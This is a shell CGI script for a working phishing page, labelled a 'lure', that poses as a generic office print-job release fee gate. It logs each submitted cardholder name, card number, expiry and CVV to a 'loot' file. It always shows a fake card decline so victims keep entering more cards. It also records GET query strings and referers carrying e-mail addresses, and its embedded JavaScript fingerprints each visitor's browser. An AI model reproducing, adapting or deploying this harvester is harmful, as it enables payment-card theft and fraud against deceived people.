#!/bin/sh
# gate_card CGI — KB Portal Whisperer bundled lure v1.0 (Smaug, 2026-10-01).
# Generic office print-release gate: "your scanned job is held, pay the
# release fee". Deliberately unbranded (house design decision 2026-09-06:
# brand clones out of scope, generic-corp in). Card POSTs are logged RAW,
# urlencoding preserved verbatim, then the form politely declines FOREVER -
# nothing is ever "accepted", so the target keeps trying other cards.
# Loot line shape (triage.sh CARD tag depends on it):
#   CARD |ts|ra=IP|ua=UA|name=..|card=..|exp=MM/YY|cvv=..
LOOTLOG="${LOOTLOG:-/tmp/kbportal_capture.log}"
U=$(echo "${HTTP_USER_AGENT:-}" | cut -c1-200)
B="" MSG="" NM=""
if [ "$REQUEST_METHOD" = "POST" ]; then
  B=$(dd bs=1 count="${CONTENT_LENGTH:-0}" 2>/dev/null)
  NM=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(name|cardname|cardholder|acctname)=' | cut -d= -f2-)
  CN=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(card|cardnumber|ccnum|ccno)=' | cut -d= -f2-)
  EX=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(mm|expmonth|exp|month)=' | cut -d= -f2-)
  YR=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(yy|expyear|year)=' | cut -d= -f2-)
  CV=$(echo "$B" | tr '&' '\n' | grep -m1 -E '^(cvv|cvc|cid|security|ccvv)=' | cut -d= -f2-)
  TS=$(date -u +%FT%TZ)
  if [ -n "$CN" ]; then
    echo "CARD |$TS|ra=$REMOTE_ADDR|ua=$U|name=$NM|card=$CN|exp=$EX/$YR|cvv=$CV" >> "$LOOTLOG" 2>/dev/null
  else
    # nonstandard form: never lose a submission - raw sanitized fallback
    echo "POST |$TS|ra=$REMOTE_ADDR|ua=$U|host=$HTTP_HOST|raw=$(echo "$B" | tr -c 'A-Za-z0-9%&=._@:-' '?' | cut -c1-240)" >> "$LOOTLOG" 2>/dev/null
  fi
  MSG="Your card was declined by the issuing network (code 05). Try another card, or ask your office manager for a manual release code."
fi
if [ "$REQUEST_METHOD" = "GET" ]; then
  TS=$(date -u +%FT%TZ)
  # query string + referer = free gold (held-job links carry e-mail addresses)
  echo "GET |$TS|ra=$REMOTE_ADDR|ua=$U|host=$HTTP_HOST|ref=$HTTP_REFERER|qs=$QUERY_STRING" >> "$LOOTLOG" 2>/dev/null
fi
echo "Content-Type: text/html"
echo ""
cat <<HTML
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Print Job Release</title>
<style>
 body{margin:0;font-family:"Segoe UI",Roboto,Arial,sans-serif;background:#eef1f4;color:#2d3742}
 .wrap{max-width:420px;margin:44px auto;padding:0 16px}
 .card{background:#fff;border-radius:12px;box-shadow:0 2px 12px rgba(20,40,60,.14);overflow:hidden}
 .bar{height:6px;background:linear-gradient(90deg,#7a4fd0,#4f7dd0)}
 .pad{padding:26px 26px 20px}
 .job{background:#f5f0ff;border:1px solid #ded0f5;border-radius:8px;padding:12px 14px;font-size:13px;margin-bottom:18px}
 .job b{color:#4a2f87}
 h1{font-size:18px;margin:0 0 4px;color:#333}
 p.sub{font-size:13px;color:#5c6a78;margin:0 0 18px;line-height:1.45}
 .err{background:#fdeaea;border:1px solid #eab7b7;color:#8a2b2b;font-size:12.5px;padding:9px 11px;border-radius:6px;margin-bottom:14px}
 label{display:block;font-size:12px;font-weight:600;color:#41515f;margin:12px 0 4px}
 input,select{width:100%;box-sizing:border-box;padding:10px;border:1px solid #c3ccd5;border-radius:6px;font-size:15px;background:#fff}
 .row{display:flex;gap:8px}.row>div{flex:1}
 button{width:100%;margin-top:16px;padding:12px;background:#5b47c9;color:#fff;border:0;border-radius:8px;font-size:15px;font-weight:600}
 .fine{font-size:11px;color:#8b98a5;margin-top:14px}
 .fee{float:right;font-weight:700;color:#4a2f87}
</style></head><body>
<div class="wrap"><div class="card"><div class="bar"></div><div class="pad">
 <h1>Release held print job<span class="fee">\$0.49</span></h1>
 <p class="sub">An external e-mail with attachments was quarantined by the secure gateway and held for the device owner.</p>
 <div class="job">Job <b>#41<span id=jn>x</span>7</b> &middot; <b>scan-to-desktop</b><br>Attachments held 24h, then purged automatically.</div>
 ${MSG:+<div class="err">$MSG</div>}
 <form method="POST" action="/login.cgi">
  <label>Name on card</label>
  <input name="name" type="text" autocomplete="cc-name" placeholder="A. Bradford">
  <label>Card number</label>
  <input name="card" type="text" inputmode="numeric" autocomplete="cc-number" placeholder="4111 1111 1111 1111">
  <div class="row">
   <div><label>Expires</label><select name="mm">
    <option value="">MM</option><option>01</option><option>02</option><option>03</option><option>04</option><option>05</option><option>06</option><option>07</option><option>08</option><option>09</option><option>10</option><option>11</option><option>12</option></select></div>
   <div><label>&nbsp;</label><select name="yy">
    <option value="">YY</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option><option>32</option></select></div>
   <div><label>CVC</label><input name="cvv" type="text" inputmode="numeric" autocomplete="cc-csc" placeholder="123"></div>
  </div>
  <button type="submit">Release my job — \$0.49</button>
 </form>
 <p class="fine">By paying the release fee you agree to the acceptable-use policy. Gateway reference <span id=gr>GRQ-0000</span>.</p>
</div></div></div>
<script>
try{document.getElementById('jn').textContent=Math.floor(Math.random()*90)+10;document.getElementById('gr').textContent='GRQ-'+Math.floor(Math.random()*9000+1000);
fetch("/fp.cgi",{method:"POST",body:JSON.stringify({p:navigator.platform||"",l:(navigator.languages||[]).join(","),tz:(Intl.DateTimeFormat().resolvedOptions().timeZone||""),sc:screen.width+"x"+screen.height+"x"+(screen.colorDepth||0),co:navigator.hardwareConcurrency||0,touch:!!(navigator.maxTouchPoints&&navigator.maxTouchPoints>0),ref:document.referrer||""})})}catch(e){}
</script>
</body></html>
HTML
